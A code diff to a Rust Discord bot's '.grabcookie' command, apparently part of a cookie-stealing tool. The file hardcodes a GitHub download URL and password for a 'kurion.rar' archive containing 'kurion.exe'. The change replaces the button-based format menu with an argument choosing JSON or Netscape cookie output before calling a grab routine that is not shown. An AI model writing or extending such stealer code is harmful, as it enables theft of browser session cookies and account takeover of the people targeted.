@@ -10,8 +10,7 @@ use std::sync::Arc;
 use std::time::Duration;
 use tokio::time::sleep;
 use twilight_http::Client as HttpClient;
-use twilight_model::channel::message::component::{ActionRow, Button, ButtonStyle};
-use twilight_model::channel::message::{Component, Message};
+use twilight_model::channel::message::Message;
 use twilight_model::http::attachment::Attachment;
 use walkdir::WalkDir;
 use zip::ZipWriter;
@@ -24,8 +23,7 @@ const MODULE_NAME: &str = "kurion.exe";
 const DOWNLOAD_URL: &str = "https://github.com/Mikasuru/Arc/raw/refs/heads/main/Assets/Scripts/kurion.rar";
 const RAR_PASSWORD: &str = "kurion67";
 
-pub const GRAB_JSON_BUTTON: &str = "grab_cookie_json";
-pub const GRAB_NETSCAPE_BUTTON: &str = "grab_cookie_netscape";
+
 
 pub use self::GrabCookieCommand as GrabCommand;
 
@@ -303,55 +301,18 @@ impl BotCommand for GrabCookieCommand {
     fn examples(&self) -> &'static [&'static str] { &[".grabcookie"] }
     fn aliases(&self) -> &'static [&'static str] { &["grab", "cookies", "getcookies"] }
 
-    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
-        let embed = twilight_util::builder::embed::EmbedBuilder::new()
-            .title("Kurion")
-            .description("Select the output format for grabbed cookies:")
-            .color(0x5865F2)
-            .field(twilight_model::channel::message::embed::EmbedField {
-                name: "JSON Format".to_string(),
-                value: "Standard JSON format.".to_string(),
-                inline: false,
-            })
-            .field(twilight_model::channel::message::embed::EmbedField {
-                name: "Netscape Format".to_string(),
-                value: "Classic cookies.txt format.".to_string(),
-                inline: false,
-            })
-            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new("Click a button below to start grabbing"))
-            .build();
-
-        let json_button = Button {
-            custom_id: Some(GRAB_JSON_BUTTON.to_string()),
-            disabled: false,
-            emoji: None,
-            label: Some("JSON".to_string()),
-            style: ButtonStyle::Primary,
-            url: None,
-            sku_id: None,
+    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, mut args: Arguments) -> Result<()> {
+        let format = args.next().unwrap_or("netscape").to_lowercase();
+        
+        let format = match format.as_str() {
+            "json" => "json",
+            "netscape" => "netscape",
+            _ => {
+                "netscape"
+            }
         };
 
-        let netscape_button = Button {
-            custom_id: Some(GRAB_NETSCAPE_BUTTON.to_string()),
-            disabled: false,
-            emoji: None,
-            label: Some("Netscape".to_string()),
-            style: ButtonStyle::Secondary,
-            url: None,
-            sku_id: None,
-        };
-
-        let action_row = Component::ActionRow(ActionRow {
-            components: vec![
-                Component::Button(json_button),
-                Component::Button(netscape_button),
-            ],
-        });
-
-        http.create_message(msg.channel_id)
-            .embeds(&[embed])
-            .components(&[action_row])
-            .await?;
+        Self::execute_grab(http, msg.channel_id, format).await?;
 
         Ok(())
     }
